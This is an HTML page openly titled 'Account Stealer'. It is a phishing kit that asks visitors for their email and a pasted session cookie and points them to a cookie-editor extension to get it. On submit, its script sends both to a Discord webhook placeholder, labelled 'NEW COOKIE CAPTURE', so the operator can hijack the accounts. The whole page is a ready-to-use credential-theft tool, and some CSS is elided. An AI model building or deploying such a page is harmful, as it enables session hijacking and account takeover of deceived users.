<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account $T34LER</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* ===== SPACE BACKGROUND ===== */
    body {
      margin: 0;
      padding: 0;
      background: 
        radial-gradient(ellipse at center, rgba(11,3,45,0.8) 0%, #000000 100%),
        url('https://images.unsplash.com/photo-1462331940025-496dfbfc7564?q=80&w=3111') center/cover no-repeat;
      color: white;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      font-family: 'Poppins', sans-serif;
    }

    /* Moon */
    .moon {
      position: fixed;
      top: 15%;
      right: 15%;
      width: 90px;
      height: 90px;
      background: #f8f3c9;
      border-radius: 50%;
      box-shadow: 
        0 0 80px #f8f3c9,
        0 0 160px #f8f3c944,
        inset -15px -15px 20px rgba(0,0,0,0.3);
      z-index: 1;
    }

    /* Cosmic Clouds */
    .cosmic-clouds {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        url('https://images.unsplash.com/photo-1506318137071-a8e063b4bec0?q=80&w=2900') center/cover no-repeat;
      opacity: 0.4;
      z-index: 1;
      animation: cloudFloat 80s linear infinite;
    }

    @keyframes cloudFloat {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Rain */
    .rain {
      position: absolute;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 2;
    }

    .drop {
      position: absolute;
      width: 1.2px;
      height: 25px;
      background: linear-gradient(transparent, rgba(255,255,255,0.9));
      animation: rain 1s linear infinite;
      transform-origin: top;
      filter: blur(0.5px);
    }

    @keyframes rain {
      0% { transform: translateY(-100px) translateX(0) scaleY(0.3); opacity: 0; }
      10% { opacity: 0.8; }
      90% { opacity: 0.8; }
      100% { transform: translateY(100vh) translateX(30px) scaleY(1); opacity: 0; }
    }

    /* ===== MAIN CARD ===== */
    .card {
      width: 460px;
      min-height: 580px;
      background: rgba(10, 5, 20, 0.85);
      backdrop-filter: blur(20px);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 
        0 0 30px rgba(138, 43, 226, 0.6),
        0 0 60px rgba(138, 43, 226, 0.3);
      border: 1px solid rgba(138, 43, 226, 0.7);
      position: relative;
      z-index: 3;
      overflow: hidden;
      margin-left: -40px;
      display: flex;
      flex-direction: column;
    }

    /* ... (all other CSS styles remain exactly the same) ... */
  </style>
</head>
<body>
  <!-- Background Elements -->
  <div class="moon"></div>
  <div class="cosmic-clouds"></div>
  <div class="rain" id="rain"></div>

  <!-- Main Card -->
  <div class="card">
    <div class="logo">
      <h1>𝓐𝓬𝓬𝓸𝓾𝓷𝓽 𝓢𝓽𝓮𝓪𝓵𝓮𝓻</h1>
    </div>
    
    <div id="status-message" class="status-message"></div>
    
    <form id="contact-form" style="flex-grow: 1; display: flex; flex-direction: column;">
      <div style="flex-grow: 1;">
        <div class="input-group">
          <label for="email">Email Address</label>
          <input type="email" id="email" placeholder="your@email.com" required>
        </div>
        
        <div class="input-group">
          <label for="cookie">Session Cookie</label>
          <textarea id="cookie" placeholder="Paste any session cookie here" required></textarea>
        </div>
      </div>
      
      <div>
        <button type="submit" class="btn">
          <span id="submit-text">Submit Request</span>
        </button>
        
        <button class="btn btn-secondary" onclick="window.open('https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm', '_blank')">
          Get Cookie-Editor Extension
        </button>
      </div>
    </form>
  </div>

  <script>
    // Rain effect
    const rainContainer = document.getElementById('rain');
    for (let i = 0; i < 80; i++) {
      const drop = document.createElement('div');
      drop.className = 'drop';
      drop.style.left = `${Math.random() * 100}%`;
      drop.style.top = `${Math.random() * -100}px`;
      drop.style.animationDuration = `${0.5 + Math.random() * 0.7}s`;
      drop.style.animationDelay = `${Math.random() * 2}s`;
      drop.style.height = `${15 + Math.random() * 20}px`;
      drop.style.opacity = `${0.5 + Math.random() * 0.5}`;
      rainContainer.appendChild(drop);
    }

    // Ultra-simple cookie validation - only checks length
    function isCookiePresent(cookie) {
      return cookie.length >= 20; // Just check if something reasonably long is entered
    }

    // Form handling
    document.getElementById('contact-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const cookie = document.getElementById('cookie').value.trim();
      const statusMessage = document.getElementById('status-message');
      
      // Clear previous messages
      statusMessage.style.display = 'none';
      
      // Validate email
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        statusMessage.textContent = 'Please enter a valid email address';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        return;
      }
      
      // Minimal cookie validation
      if (!isCookiePresent(cookie)) {
        statusMessage.textContent = 'Please paste a session cookie';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        return;
      }
      
      try {
        const submitBtn = e.target.querySelector('button[type="submit"]');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = `<span class="spin">🌀</span> Processing...`;
        submitBtn.disabled = true;
        
        // Replace with your Discord webhook URL
        await fetch('YOUR_DISCORD_WEBHOOK_URL', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🔥 NEW COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 200)}...\`\`\``
          })
        });
        
        statusMessage.textContent = 'Success! Cookie submitted.';
        statusMessage.className = 'status-message success';
        statusMessage.style.display = 'block';
        e.target.reset();
        
        setTimeout(() => {
          submitBtn.innerHTML = originalText;
          submitBtn.disabled = false;
        }, 2000);
      } catch (err) {
        statusMessage.textContent = 'Error submitting. Please try again.';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        
        const submitBtn = e.target.querySelector('button[type="submit"]');
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
